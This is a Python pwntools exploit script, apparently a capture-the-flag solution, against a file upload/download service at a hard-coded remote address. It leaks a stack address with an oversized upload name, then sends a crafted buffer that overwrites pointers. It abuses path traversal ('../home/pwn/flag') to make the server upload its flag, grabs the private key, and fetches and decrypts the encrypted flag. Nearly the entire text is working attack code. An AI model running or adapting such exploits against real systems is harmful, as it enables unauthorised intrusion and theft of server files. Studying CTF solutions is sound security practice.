from pwn import *
import os
import time
#p = process("./main")
p =remote("121.36.28.133",60001)
context.log_level="debug"
#gdb.attach(p,"b *0x6c162f\nb *0x437b1f")
p.sendline("aa")
def list(p):
    p.recvuntil(">>\n")
    p.sendline("1")
def upload(name,p):
    p.recvuntil(">>\n")
    p.sendline("2")
    p.recvuntil(">>\n")
    p.sendline(name)
def download(name,p):
    p.recvuntil(">>\n")
    p.sendline("3")
    p.recvuntil(">>\n")
    p.sendline(name)

upload("a"*0x200,p)
print p.recvuntil("fp=")
stack_addr = int(p.recv(9)+"e00",16)
time.sleep(1)
p.close()
#p = process("./main")
p =remote("121.36.28.133",60001)
p.sendline("aa")
upload(p64(0x6c0700)+"a"*0xa0+"b"*0x50+"d"*0x8+p64(stack_addr)+"f"*0x8+"e"*0x10+"c"*0x48+p64(stack_addr)+p64(stack_addr),p)
p.recvuntil(">>\n")
p.sendline("../home/pwn/flag")
p.recvuntil("upload file_name:")
file_name = p.recvline()[:-1]
print file_name
p.recvuntil("privateKey:  ")
privateKey = p.recvline()
print privateKey
with open("./privateKey","wb") as f:
    f.write(privateKey)
print p.recv()
time.sleep(3)
#p1 = process("./main")
p1 =remote("121.36.28.133",60001)
p1.sendline("aa")
download(file_name,p1)
p1.recvuntil("GMT\n")
encrypt_flag = p1.recvuntil("####")[:-5]
with open("./flag","wb") as f:
    f.write(encrypt_flag)
p1.close()
process = os.popen("./src")
output = process.read()
print output
process.close()
